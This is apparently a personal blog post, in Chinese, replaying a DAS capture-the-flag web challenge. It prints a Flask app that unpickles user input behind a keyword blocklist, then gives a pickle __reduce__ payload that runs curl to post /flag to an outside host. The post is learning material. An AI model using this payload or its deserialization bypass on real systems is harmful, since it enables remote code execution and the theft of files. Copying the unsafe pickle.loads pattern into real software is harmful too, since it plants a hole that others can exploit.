---
title: das复现
date: '2025-05-05 09:39:16'
updated: '2025-05-08 23:57:26'
permalink: /post/das-reappearance-1dbbyw.html
comments: true
toc: true
---



# das复现

感觉学web学了挺久的，但是都停留在很基础的php方向的东西，想进一步学习，但是没有什么体系，想到了比较重要的das比赛，就想越级复现一下，感觉会很难，但是复现出来应该能学到很多东西

## const_python

> 自认为搭建了一个完美的web应用，不会有问题，很自信地在src存放了源码，应该不会有人能拿到/flag的内容。

那就先访问src看看源码

```python

import builtins
import io
import sys
import uuid
from flask import Flask, request,jsonify,session
import pickle
import base64


app = Flask(__name__)

app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "")


class User:
    def __init__(self, username, password, auth='ctfer'):
        self.username = username
        self.password = password
        self.auth = auth

password = str(uuid.uuid4()).replace("-", "")
Admin = User('admin', password,"admin")

@app.route('/')
def index():
    return "Welcome to my application"


@app.route('/login', methods=['GET', 'POST'])
def post_login():
    if request.method == 'POST':

        username = request.form['username']
        password = request.form['password']


        if username == 'admin' :
            if password == admin.password:
                session['username'] = "admin"
                return "Welcome Admin"
            else:
                return "Invalid Credentials"
        else:
            session['username'] = username


    return '''
        <form method="post">
        <!-- /src may help you>
            Username: <input type="text" name="username"><br>
            Password: <input type="password" name="password"><br>
            <input type="submit" value="Login">
        </form>
    '''


@app.route('/ppicklee', methods=['POST'])
def ppicklee():
    data = request.form['data']

    sys.modules['os'] = "not allowed"
    sys.modules['sys'] = "not allowed"
    try:

        pickle_data = base64.b64decode(data)
        for i in {"os", "system", "eval", 'setstate', "globals", 'exec', '__builtins__', 'template', 'render', '\\',
                 'compile', 'requests', 'exit',  'pickle',"class","mro","flask","sys","base","init","config","session"}:
            if i.encode() in pickle_data:
                return i+" waf !!!!!!!"

        pickle.loads(pickle_data)
        return "success pickle"
    except Exception as e:
        return "fail pickle"


@app.route('/admin', methods=['POST'])
def admin():
    username = session['username']
    if username != "admin":
        return jsonify({"message": 'You are not admin!'})
    return "Welcome Admin"


@app.route('/src')
def src():
    return  open("app.py", "r",encoding="utf-8").read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5000)
```

看到了几个页面
首先是登录页面，会给一个session，可以考虑会不会能伪造session，但是要拿到 `SECRET_KEY`
然后是admin界面，看着没东西，也进不去
最后是感觉最重要的pickle序列化的界面，所以先详细的学一下pickle反序列化

学完归来，这里可以使用 `opcode` 的方式修改 `Admin` 对象的password来获得权限，感觉已经修改了admin 的密码，但是访问不了admin账户，应该是给限制住了orz

![image-20250421173643922](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250421173643922.png)

看了wp，完全不是这个解法，就是利用pickle获取rce权限

看了李师傅的博客，了解了一种打法，利用没有过滤 `import` 和 `subprocess`

`subprocess`是一个python的模块，用来创建和管理子进程

```python
import subprocess
result = subprocess.run(['ls'],capture_output=True,text=True)
print(result.stdout)
```

![image-20250421182349519](https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20250421182349519.png)

大佬们用的是

```python
import pickle
import base64

class User:
    def __init__(self, username, password, auth='ctfer'):
        self.username = username
        self.password = password
        self.auth = auth
    def __reduce__(self):
        host = '<ip地址>'
        port = 8888
        return __import__("subprocess").run, ([
            'curl',
            '-d',
            '@/flag',
            f'http://{host}:{port}/test'
        ],)

user = User('test', 'test')
data = pickle.dumps(user)
print(data)
data = base64.b64encode(data)
print(data)
```
